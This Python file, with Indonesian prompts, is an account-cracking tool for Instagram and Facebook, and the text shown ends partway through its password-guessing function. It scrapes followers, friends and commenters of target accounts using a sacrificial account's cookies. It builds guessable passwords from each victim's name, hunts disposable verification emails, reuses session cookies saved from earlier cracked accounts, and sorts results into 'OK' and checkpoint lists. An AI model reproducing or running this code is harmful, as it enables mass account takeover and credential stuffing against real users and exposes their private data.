#!/usr/bin/env python
# -*- coding: utf-8 -*-

Los, xx, un = 0, 0, []
Warning = '\n\n [!] Jangan Edit Apapun Agar Script Berjalan Dengan Semestinya, terima kasih'

import re, os, uuid, sys, requests, datetime, hashlib, urllib, pytz, zlib, time, json, random, base64, string, platform
from bs4 import BeautifulSoup as bsp
from concurrent.futures import ThreadPoolExecutor
from rich import print as Print
from rich.tree import Tree
from rich.panel import Panel as Nel
from rich.console import Console

P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K = "\033[33m"
M, K2 = K, K
WR = random.choice(['\x1b[1;97m','\x1b[1;91m','\x1b[1;92m','\x1b[1;93m','\x1b[1;94m','\x1b[1;95m','\x1b[1;96m'])

Tema  = []
Lylii = 'color(4)'
Mail  = []
datetim = datetime.datetime.now()
datenow = '%s-%s-%s'%(datetim.day,datetim.month,datetim.year)
file_ok = '%s-%s-%s'%(datetim.day,datetim.month,datetim.year)
KamuNya = b'x\x9c\xcb())(\xb6\xd2\xd7/H,.I\xd5+I\xd6/J,\xd7\xcf)(\xc8\xd651335\x06\x00\xb4|\n\x82'
temane  = []

class MAIN:

   userid = [] #-> Dump IG
   pk_idg = [] #-> Dump IG
   fauser = [] #-> Dump Facebook
   id, Loop, MethodType, ResultSuccess, ResultChechpoint,UbahData,info,proxi, \
   NazriDev, MID, PROXY, CrackDuplikat, bugbaru = [], 0, [], 0, 0, [], {}, [], {}, [], {'Update':None,'proxi':[]}, [], []


   def __init__(self):
       super(MAIN).__init__()
       self.head = {'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0; F5321 Build/34.4.A.2.32; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (26/8.0.0; 320dpi; 720x1184; Sony; F5321; F5321; qcom; ru_RU; 99640905)',}

   def MyRich(self, Text, chos=None, title=None):
       self.cat = 'color(8)'
       if self.cat not in Tema:Tema.append(self.cat)
       if chos:
          Console(width=62).print(Nel(Text,subtitle='┌─',subtitle_align='left',\
          style=self.cat,title=title))
       else:
          Console(width=62).print(Nel(Text, \
          style=self.cat,title=title))
   
   def MyRic(self, Text, chos=None):
       self.cat = 'color(8)'
       if self.cat not in temane:temane.append(self.cat)
       if chos:
          Console(width=62).print(Nel(Text,subtitle='┌─',subtitle_align='left',\
          style=self.cat))
       else:
          Console(width=62).print(Nel(Text, \
          style=self.cat))

   def Me(self):
       self.MyRich('''[blue]
  ██▓  ▄████  ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀
  ▓██▒ ██▒ ▀█▒▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
  ▒██▒▒██░▄▄▄░▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
  ░██░░▓█  ██▓▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
  ░██░░▒▓███▀▒▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
  ░▓   ░▒   ▒ ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
  ▒ ░  ░   ░   ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
  ▒ ░░ ░   ░ ░          ░░   ░   ░   ▒   ░        ░ ░░ ░ ''')

   def find_res(self, meki=[]):
       try:
           self.file = os.listdir('data')
           self.dihi = 0
           print('\n [ Pilih File Anda ]\n')
           for self.su in self.file:
               if 'ok' not in self.su.lower() or 'cp' in self.su.lower():pass
               else:
                    self.dihi +=1
                    print(' %s. %s'%(self.dihi,self.su))
           self.name = input('\n Masukan nama file : ')
       except Exception as e:exit(e)
       for a in open(f'data/{self.name}','r').read().splitlines():
           xyz = re.findall('ds_user_id=(.*)',str(a))
           if len(xyz) == 0:continue
           else:
                if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
       if len(meki) == 0:
          exit(f'\nTidak Bisa menemukan cokie!')
       else:
          for memek in meki:
              try:
                  print(f'\n Mencoba: {H}{memek}{P}')
                  xyz = {'Mozilla/5.0 (Linux; Android 14; SM-F731B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.5 Mobile Safari/537.36'}
                  uid = re.search('ds_user_id=(\d+)', str(memek)).group(1)
                  req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':memek}).json()['user']['full_name']
                  open('data/IG-login.txt','w').write(f'{memek}')
                  print(f'\n {P}Login sebagai : {H}{req}')
                  time.sleep(2)
                  os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
                  self.insta()
              except Exception as e:
                  print(f'\n{P} Expired: {K}{memek}')

   def aset_ig(self):
       os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
       if os.path.isfile('data/IG-login.txt') is True:
           self.coki = {'cookie':open('data/IG-login.txt','r').read()}
       else:
           os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
           self.Me()
           self.MyRich("[white]Jika Anda Sudah Mendapatkan Result OK Anda Bisa Login Menggunakan Hasil Yang Tadi Dengan Ketikan '[green]res[/]' Jika Belum Punya Masukan Cookie Akun Instagram Di Bawah Ini",True)
           self.momo = {'cookie':Console(style=Tema[0]).input(f'   └──> ')}
           if self.momo['cookie'] == 'res':
              self.coki = {'cookie':self.find_res()}
           else:self.coki = self.momo
       try:
           xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
           cek = requests.get('https://www.instagram.com/api/v1/tags/web_info/?tag_name=khmd', headers=xyz,  cookies=self.coki).json()
           uid = re.search('ds_user_id=(\d+)', str(self.coki['cookie'])).group(1)
           req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies=self.coki).json()['user']
           open('data/IG-login.txt','w').write(f'{self.coki["cookie"]}')
       except:
           os.system('rm -rf data/IG-login.txt')
           print('\nInvalid cookie')
           exit()
       os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
       return self.coki, req['full_name'], req['follower_count'], req['username']

   def insta(self):
       os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
       self.aset, self.nama, self.fol, self.usr = self.aset_ig()
       self.Me()
       if len(self.nama) > 11:
          self.nama = self.nama[:11]
       self.ds_user  = re.search('ds_user_id=(\d+)',str(self.aset)).group(1)
       self.MyRich(f'''[white]
 >> Username         : {self.usr}
 >> FullName         : {self.nama}
 >> Followers        : {self.fol}
 >> User ID          : {self.ds_user} \n''',None,'[white]> [green]DETAIL USER[/] <')
       self.MyRich(''' [white]01. Crack Dari Followers    06. Crack Dari Komentar
 02. Crack Dari Following    07. Crack Unlimited Followers
 03. Check Akun Checkpoint   08. Setting Thema/Warna Panel
 04. Check Hasil Crack       09. Laporkan Bug/Upgrade Key
 05. Save Hasil Ke SDcard    10. Ganti Akun Tumbal
 11. Cari Akun Verif Email   12. Crack Akun Facebook''',True)
       self.chs(self.aset)

   def chs(self, assets):
       while True:
         x = Console(style=Tema[0]).input(f'   └──> ')
         if x in   ['01','1']:self.dumps(assets, True)
         elif x in ['02','2']:self.dumps(assets, False)
         elif x in ['03','3']:self.Ulang()
         elif x in ['04','4']:self.igrst()
         elif x in ['05','5']:self.save_sd()
         elif x in ['06','6']:self.komentar(assets)
         elif x in ['07','7']:self.Unli(assets)
         elif x in ['08','8']:self.theme()
         elif x in ['09','9']:exit(os.system('xdg-open https://wa.me/+6285729416714?text='))
         elif x in ['10']:os.system('rm -rf data/IG-login.txt');self.insta()
         elif x in ['12']:
            #   exit('\nFiture Akan Tersedia Dalam Beberapa H/M')
              if os.path.isfile('data/FB-login.txt') is False:
                 exit(self.MyRich(f'[white]\
Untuk Menggunakan Fitur Ini Anda Harus Jalankan Dengan Memasukan Perintah Di Bawah Ini\n\
\n\t    [bold green]python {sys.argv[0]} FACEBOOK=True[/]\n\
\n\tSalin Text Di Atas Untuk Mempercepat!'))
              else:
                 try:
                     self.cokie, self.token = open('data/FB-login.txt','r').read().split('|')
                     self.req = requests.post('https://graph.facebook.com/me?batch=[{"method":"get","relative_url":"me"}]&include_headers=false&access_token=%s'%(self.token), cookies={'cookie':self.cokie}).json()
                     self.res = json.loads(self.req[0]['body'])
                     self.ttl = self.res['birthday']
                     self.uid = self.res['id']
                     self.lam = self.Gender(self.res['gender'])
                     self.nam = self.res['name']
                     self.MyRich(f'[white]\n >> Nama Users : {self.nam}\n >> Gender     : {self.lam}\n >> BirthDay   : {self.ttl}\n >> UserID     : {self.uid}\n',None,'[white]> [green]DETAIL USER[/] <')
                 except (KeyError, Exception):
                     exit('\nMembutuhkan cookie baru!')
              self.Facebook(cookies=self.cokie, token=self.token)
         elif x in ['11']:
              self.MyRich('[white]Masukan Kata Kunci Untuk Pencarian Email, Misalnya : good,boy,girl kata kunci dengan menggunakan bahasa inggris akan cepat mendapatkan email!',True)
              self.Target = Console(style=Tema[0]).input(f'   └──> ').replace(' ','').split(',')
              self.MyRich('[white] 01. Tampilkan Hanya Email Dari Facebook\n 02. Tampilkan Hanya Email Dari Instagram\n 03. Tampilkan Hanya Email Dari Tiktok\n 04. Tampilkan Hanya Email Dari Twitter\n 05. Tampilkan Semua Tidak Di Filter',True)
              self.fil = Console(style=Tema[0]).input(f'   └──> ')
              if self.fil in   ['1','01']:filter='fb'
              elif self.fil in ['2','02']:filter='ig'
              elif self.fil in ['3','03']:filter='tk' # tiktok
              elif self.fil in ['4','04']:filter='tw' # twiter
              elif self.fil in ['5','05']:filter='ls' # all
              else:filter='ls'
              self.CariNama(self.Target, filter)

   def CariNama(self, Items, Fil):
       self.MyRich(f'[white]Proses Sedang Di Mulai! Email Yang Tersedia Akun [Tiktok,Facebook,Instagram,Twitter] Akan Di Simpan Di Dalam Folder [green]data/email/Email-{datenow}[/] Nikamati Semua Fiture Yang Saya Berikan:)')
       self.bef = []
       print('')
       with ThreadPoolExecutor(max_workers=3) as Executor:
           for self.e in Items:
               Executor.submit(self.FindMesage, self.e, self.bef, Fil)
       if len(self.bef) !=0:
          exit(f'\nSelamat Kamu Mendapatkan {len(self.bef)} Email\nKata Kunci {Items}')
       else:
          exit('\nGunakan Kata Kunci Yang Lain!')

   def FindMesage(self, user, duplikat, filters):
       global Los
       try:
            self.req = requests.get(f'https://inboxkitten.com/api/v1/mail/list?recipient={user}').json()
            for self.mes in self.req:
                self.sender = re.findall("'sender': '(.*?)'",str(self.mes))
                self.alamat = re.findall("'recipient': '(.*?)'",str(self.mes))
                if str(filters) == 'ls':
                   if 'instagram' in str(self.sender[0].lower()) or 'facebook' in str(self.sender[0].lower()) or 'instagram' in str(self.sender[0].lower()) or 'tiktok' in str(self.sender[0].lower()) or 'tiktok' in str(self.sender[0].lower()) or 'twitter' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                          open(f'data/email/EmailAcak-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                   else: Los +=1
                elif filters == 'ig':
                    if 'instagram' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'data/email/EmailInstagram-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open('tes.json','a').write(f'{self.alamat[0]}\n')
                          duplikat.append(self.alamat[0])
                    else: Los +=1
                elif str(filters) == 'tk':
                    if 'tiktok' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'data/email/EmailTiktok-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                    else: Los +=1
                elif str(filters) == 'tw':
                    if 'twitter' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'data/email/EmailTwitter-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                    else: Los +=1
                elif str(filters) == 'fb':
                    if 'facebook' in str(self.sender[0].lower()):
                       if self.alamat[0] not in duplikat:
                          self.url = 'https://inboxkitten.com/inbox/%s/list'%(self.alamat[0].split('@')[0])
                          print('\rPesan Dari : %s\nEmail Verifikasi : %s\nWeb Verifykasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          open(f'data/email/EmailFacebook-{datenow}','a').write('\nPesan Dari : %s\nEmail Verifikasi : %s\nWeb Veryfikasi : %s\n'%(str(self.sender[0].lower()),self.alamat[0],self.url))
                          duplikat.append(self.alamat[0])
                    else: Los +=1
            print(f'Success: {len(duplikat)} Skip: {Los}',end='\r')
       except:pass

   def Facebook(self, **args):
       self.token = str(args['token'])
       self.cokie = str(args['cookies'])
       self.MyRich('''[white] 01. Crack Dari Teman           06. Check Hasil Crack
 02. Crack Dari Komentar        07. Crack Ulang Akun CP
 03. Crack Dari Anggota Group   08. Check Opsi Akun CP
 04. Crack Dari Pencarian Nama  09. Ganti Akun Tumbal
 05. Crack Dari Random Email    10. Kembali''',True)
       while True:
          x = Console(style=Tema[0]).input(f'   └──> ')
          if x in   ['01','1']:self.TemanFb(self.cokie, self.token)
          elif x in ['02','2']:self.KomentarFb(self.cokie)
          elif x in ['03','3']:self.AnggotaGroup(self.cokie)
          elif x in ['04','4']:self.PencarianNamaFb(self.cokie)
          elif x in ['05','5']:self.RandomEmail()
          elif x in ['06','6']:self.HasilFb()
          elif x in ['07','7']:self.CrackUlangFb()
          elif x in ['08','8']:self.CekOpsi()
          elif x in ['09','9']:os.system('rm -rfdata/FB-login.txt');self.insta()
          elif x in ['10']:self.insta()

   def TemanFb(self, cokie, token):
       self.MyRich('[white]Masukan ID Target Gunakan Tanda Koma Sebagai Pemisah (,)',True)
       self.ab = Console(style=Tema[0]).input(f'   └──> ').split(',')
       with ThreadPoolExecutor(max_workers=2) as Exe:
          for self.id in self.ab:Exe.submit(self.DumpTeman, self.id, cokie, token)

   def DumpTeman(self, user, cokie, token):
       with requests.Session() as self.r:
         try:
             self.req = self.r.get('https://graph.facebook.com/%s?fields=friends&access_token=%s'%(user, token), cookies={'cookie':cokie}).json()['friends']['data']
             for self.apc in self.req:
                 self.mat = '%s|%s'%(self.apc['name'], self.apc['id'])
                 if self.mat not in self.fauser:self.fauser.append(self.mat)
         except:pass

   def KomentarFb(self, cokie):
       self.MyRich('[white]Masukan link postingan Pastikan Target Bersifat Publik [Group,Post Teman]',True)
       self.link = Console(style=Tema[0]).input(f'   └──> ')
       self.host = self.link.split('//')[1].split('/')[0]
       self.repl = self.link.replace(self.host,'mbasic.facebook.com')
       self.DumpKomen(self.repl, cokie)

   def DumpKomen(self, curl, cokie):
       with requests.Session() as self.r:
         try:
             self.req  = self.r.get(curl, cookies={'cookie':cokie}).text
             self.data = re.findall('<h3><a class=".*?" href="(.*?)">(.*?)</a></h3>', str(self.req))
             for self.apc in self.data:
                 if '/profile.php?' in self.apc[0]:
                     self.id, self.nama = re.search('id=(.*?)&',str(self.apc[0])).group(1), self.apc[1]
                     self.mat = '%s|%s'%(self.nama, self.id)
                     print(self.mat)
                     if self.mat not in self.fauser:self.fauser.append(self.mat)
                 else:
                     self.username, self.nama = re.search('/(.*?)?eav',str(self.apc[0])).group(1), self.apc[1]
                     self.mat = '%s|%s'%(self.nama, self.username.split('?')[0])
                     print(self.mat)
                     if self.mat not in self.fauser:self.fauser.append(self.mat)
             for self.link in bsp(self.req,'html.parser').find_all('a', href=True):
                 if 'Lihat komentar lainnya…' in str(self.link.text):
                     self.DumpKomen(self.link['href'], cokie)
                 else:continue
         except:pass

   def Gender(self, xxxx):
       return 'Laki-Laki' if xxxx.lower() == 'male' else 'Perempuan'

   def theme(self):
       self.MyRich('\
[white] 01. Set Tema Hijau          04. Set Tema Putih\n\
 02. Set Tema Merah          05. Set Tema Ungu\n\
 03. Set Tema Biru           06. Set Tema Kuning\n\
 07. Set Tema Default',True)
       while True:
          x = Console(style=Tema[0]).input(f'   └──> ')
          if x in   ['01','1']:open('cat_rich.py','w').write("Lylii = 'color(10)'")
          elif x in ['02','2']:open('cat_rich.py','w').write("Lylii = 'color(9)'")
          elif x in ['03','3']:open('cat_rich.py','w').write("Lylii = 'color(4)'")
          elif x in ['04','4']:open('cat_rich.py','w').write("Lylii = 'color(7)'")
          elif x in ['05','5']:open('cat_rich.py','w').write("Lylii = 'color(5)'")
          elif x in ['06','6']:open('cat_rich.py','w').write("Lylii = 'color(3)'")
          elif x in ['07','7']:open('cat_rich.py','w').write("Lylii = 'color(8)'")
          exit(os.system(f'python {sys.argv[0]}'))

   def save_sd(self, col = []):
       try:
           self.file = os.listdir('data')
           self.hitg = 0
           print('\n [ Pilih File Anda ]\n')
           for self.su in self.file:
               self.xy = self.su.split('Instagram')
               if len(self.xy) <2:pass
               else:
                    self.hitg +=1
                    col.append(self.su)
                    print(' %s. %s'%(self.hitg,self.su))
           print('')
           self.MyRich('[white]Ketik [green]all[/] Untuk Menyimpan Semua Hasil Crack Anda Ke sdcard OnTap. Masukan nama file jika ingin menyimpan salah satu',True)
           self.name = Console(style=Tema[0]).input(f'   └──> ')
           if self.name in ('all','All'):
              for self.xyz in col:
                  os.system(f'cp data/{self.xyz} /sdcard')
              exit('\nDone')
           else:
              os.system(f'cp data/{self.name} /sdcard')
              exit('\nDone')
       except Exception as e:exit(e)

   def komentar(self, cokie, dav=[]):
       self.MyRich('[white]Masukan link postingan atau reels. pisahkan dengan koma',True)
       link = Console(style=Tema[0]).input(f'   └──> ').split(',')
       try:
           for ling in link:
               self.r = requests.get(ling, cookies=cokie).text
               self.o = re.search('"media_id":"(\d+)"', str(self.r)).group(1)
               dav.append(self.o)
           for self.x in dav:
               self.dump_komen(cokie, self.x, '')
       except:pass
       self.ToolsType()

   def dump_komen(self, cokie, uid, min):
       global xx
       try:
            self.r = requests.get(f"https://i.instagram.com/api/v1/media/{uid}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min}", cookies = cokie, headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}).json()
            for self.i in self.r['comments']:
                self.a = self.i['user']['username'] +'|'+ self.i['user']['full_name']
                if self.a not in self.pk_idg:
                   self.pk_idg.append(self.a)
                   xx +=1
                   Console(style=Tema[0]).print(f'   └──> Berhasil dump [green]{xx}[/] id [white]{uid}[/]',end='\r')
            if 'next_min_id' in str(self.r):
                self.dump_komen(cokie, uid, self.r['next_min_id'])
       except:pass

   def Unli(self, cokie):
       if 'csrftoken' not in str(cokie['cookie']):
          try:
              self.memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cokie).json()
              self.token = self.memek['config']['csrf_token']
              cokie['cookie'] +=';csrftoken=%s;'%(self.token)
          except Exception as e:
              os.system('rm -rf data/IG-login.txt')
              exit(f'\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
       self.MyRich('[white]Masukan username akun instagram Pastikan (Target Memiliki Followers, Akun Bersifat Publik, Tidak Centang Biru)[/]',True)
       self.user = Console(style=Tema[0]).input(f'   └──> ')
       try:
           req = requests.get(f'https://www.instagram.com/{self.user}/', cookies = cokie).text
           uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
           self.Exekusi(uid, cokie, '', True,True)
       except:pass
       if len(un) > 0:
          self.MyRich('[white]Matikan data/wifi jika anda ingin stop dump!. jangan gunakan [red]CTRL + C[/]')
          for self.momok in un:
              self.Graphql(True, self.momok, cokie['cookie'], '')
       else:exit('\nGanti Username/Tumbal!')
       self.ToolsType()

   def igrst(self):
       print('')
       self.dirs  = os.listdir('data')
       self.index = 0
       for self.name in self.dirs:
           if '-' not in self.name or 'login' in self.name:pass
           else:
                self.index+=1
                print(' %s. data/%s'%(self.index, self.name))
       print('')
       self.MyRich('\
[white]Masukan Nama File Untuk Melihat Hasil, Gunakan koma untuk pemisahan nama file',True)
       self.file = Console(style=Tema[0]).input(f'   └──> ').split(',')
       for self.bx in self.file:
           for self.xv in open(self.bx,'r').read().splitlines():
               print(' %s\n'%(self.xv))
       exit()

   def Ulang(self):
       try:
          dirs = os.listdir('data')
          asuu = 0
          if len(dirs) == 0:exit(f'\n{P}[{M}!{P}] File Tidak Ada')
          print('')
          for asu in dirs:
              if 'CP' not in str(asu):pass
              else:
                  asuu +=1
                  print(f' {asuu}. {asu}')
          print('')
          self.MyRich('[white]Masukan Nama file. Jangan Angkanya contoh: CP/Example.txt',True)
          file = Console(style=Tema[0]).input(f'   └──> ')
          for rest in open(f'data/{file}','r').read().splitlines():
              uid, pas = rest.split('|')[0], rest.split('|')[1]
              self.pk_idg.append(f'{uid}|{pas}')
              Console(style=Tema[0]).print(f'   └──> Berhasil dump [green]{len(self.pk_idg)}[/]',end='\r')
       except (FileNotFoundError,ValueError):
          exit('\nFile Tidak Ada Atau Pemisahan Salah.')
       self.ToolsType()

   def dumps(self, cintil, typess, xyz = []):
       if 'csrftoken' not in str(cintil['cookie']):
          try:
              self.memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cintil).json()
              self.token = self.memek['config']['csrf_token']
              cintil['cookie'] +=';csrftoken=%s;'%(self.token)
          except Exception as e:
              os.system('rm -rf data/IG-login.txt')
              exit(f'\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
       self.MyRich('[white]Masukan username akun instagram Pastikan (Target Memiliki Followers, Akun Bersifat Publik, Tidak Centang Biru) Ingin banyak target gunakan tanda koma sebagai pemisah contohnya [green](rikod_jual1,miskindeh)[/]',True)
       users = Console(style=Tema[0]).input(f'   └──> ').split(',')
       try:
           for self.y in users:
               req = requests.get(f'https://www.instagram.com/{self.y}/', cookies = cintil).text
               uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
               if uid not in xyz:xyz.append(uid)
       except:pass
       try:
           mode = 'followers' if typess is True else 'following'
           for kintil in xyz:
               if typess is True:self.Graphql(True, kintil, cintil['cookie'], '')
               else:self.Graphql(False, kintil, cintil['cookie'], '')
       except:
            exit(self.ToolsType())
       exit(self.ToolsType())

   def Exekusi(self, uid, cokie, next, mode,unli=None):
       global xx
       headers = {'Host': 'www.instagram.com','x-requested-with': 'XMLHttpRequest','x-csrftoken': re.search('csrftoken=(.*?);',str(cokie['cookie'])).group(1),'x-ig-app-id': '1217981644879628','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
       params  = {'count': '12','search_surface': 'follow_list_page','max_id':next}
       if mode == 'following':response = requests.get(f'https://www.instagram.com/api/v1/friendships/{uid}/following/?count=12&max_id={next}', cookies=cokie,headers=headers).json()
       else:response = requests.get(f'https://www.instagram.com/api/v1/friendships/{uid}/followers/',params=params,cookies=cokie,headers=headers).json()
       for self.mmk in response['users']:
           xx+=1
           self.xy = self.mmk['username'] + '|' + self.mmk['full_name']
           if self.xy not in self.pk_idg:
              if unli is None:
                 self.pk_idg.append(self.xy)
              else:
                 self.zc = self.mmk['pk']
                 un.append(self.zc)
                 if len(un) == 5:
                    break
       if 'next_max_id' in str(response):
           self.Exekusi(uid, cokie, response['next_max_id'], mode)

   def Graphql(self, typess, userid, cokie,after):
       global xx
       self.api = "https://www.instagram.com/graphql/query/"
       self.csr = 'variables={"id":"%s","first":24,"after":"%s"}'%(userid,after)
       self.mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(self.csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(self.csr)
       try:
           self.ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
           self.req = requests.get(self.api, params=self.mek, headers=self.ptk).json()
           if 'require_login' in self.req:
               if len(self.pk_idg) > 0:
                  pass
               else:
                  exit(f'\n{P}Invalid Cookie')
           self.khm = 'edge_followed_by' if typess is True else 'edge_follow'
           for self.xyz in self.req['data']['user'][self.khm]['edges']:
               self.xy = self.xyz['node']['username'] + '|' + self.xyz['node']['full_name']
               if self.xy not in self.pk_idg:
                  xx +=1
                #   open('dumpig.txt','a', encoding='utf-8').write(f"{self.xyz['node']['username']}\n")
                  self.pk_idg.append(self.xy)
                  Console(style=Tema[0]).print(f'   └──> Berhasil dump [green]{xx}[/] id [white]{userid}[/]',end='\r')
           self.end = self.req['data']['user'][self.khm]['page_info']['has_next_page']
           if self.end is True:
               self.after = self.req['data']['user'][self.khm]['page_info']['end_cursor']
               self.Graphql(typess, userid, cokie, self.after)
           else:pass
       except:
        return 1

   def ToolsType(self):
       MAIN().List(self.pk_idg)
       
   def List(self, uid):
       for me in uid:self.id.append(me)
       self.MyRic('\
[white]01. Api Private Threads     03. Api Private Type Recovery\
 02. Api Private Type Manual 04. Api Private Type SmartLock',True)

       self.Main()
   def Main(self):
       while True:
         x = Console(style=temane[0]).input('   └──> ')
         if x in   ['01','1']: self.MethodType.append('1')
         elif x in ['02','2']: self.MethodType.append('2')
         elif x in ['03','3']: self.MethodType.append('3')
         elif x in ['04','4']: self.MethodType.append('4')
         break
    #    self.proxi_anony('https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=socks5&proxy_format=protocolipport&format=text&timeout=20000')
       self.Exekusy()

   def Exekusy(self):
       self.MyRic('\
[white]Perlu Di Perhatikan Mengubah Data Menggunakan Script Dapat Menyebabkan Akun Terkena Sesi/Checkpoint \
Saran Untuk Tidak Menggunakan Fiture Ini. Jika Anda Ingin Mengubah Data Ketikan [green]y [/]sebaliknya ketikan [green]t',True)
       x = Console(style=temane[0]).input(f'   └──> ')
       if x in ['ya','y']:self.UbahData.append(True)
       else:self.UbahData.append(False)
       self.Exekusy2()

   #-> Buat Sandi
   def pwdc(self, nama, full, komb):
       self.x,self.i = [], []
       for self.y in nama.split(' '):
           if len(self.y) <2:continue
           elif len(self.y) == 3 or len(self.y) == 4 or len(self.y) == 5:
              self.z = self.y.lower()
              if komb == '1' or komb == '01':
                  self.x.append(self.z)
                  self.x.append(self.z+'123')
                  self.x.append(self.z+'123')
                  self.x.append(self.z+'1234')
                  self.x.append(self.z+'12345')
                  self.x.append(self.z+'123456')
                  self.x.append(self.z+'01')
                  self.x.append(self.z+'02')
                  self.x.append(self.z+'03')
                  self.x.append(self.z+'04')
                  self.x.append(self.z+'05')
                  self.x.append(self.z+'11')
                  self.x.append(self.z+'12')
                  self.x.append(self.z+'13')
                  self.x.append(self.z+'21')
                  self.x.append(self.z+'22')
                  self.x.append(self.z+'23')
                  self.x.append(self.z+'cantik')
              elif komb == '2' or komb == '02':
                  self.x.append(self.z+'123')
                  self.x.append(self.z+'1234')
                  self.x.append(self.z+'12345')
                  self.x.append(self.z+'123456')
              else:
                  self.x.append(self.z)
                  self.x.append(self.z+'123')
                  self.x.append(self.z+'123')
                  self.x.append(self.z+'1234')
                  self.x.append(self.z+'12345')
                  self.x.append(self.z+'123456')
                  self.x.append(self.z+'01')
                  self.x.append(self.z+'02')
                  self.x.append(self.z+'03')
                  self.x.append(self.z+'04')
                  self.x.append(self.z+'05')
                  self.x.append(self.z+'11')
                  self.x.append(self.z+'12')
                  self.x.append(self.z+'13')
                  self.x.append(self.z+'21')
                  self.x.append(self.z+'22')
                  self.x.append(self.z+'23')
                  self.x.append(self.z+'cantik')
           else:
               self.z = self.y.lower()
               if komb == '1' or komb == '01':
                   self.x.append(self.z+'123')
                   self.x.append(self.z+'1234')
                   self.x.append(self.z+'12345')
                   self.x.append(self.z)
               elif komb == '2' or komb == '02':
                   self.x.append(self.z+'123')
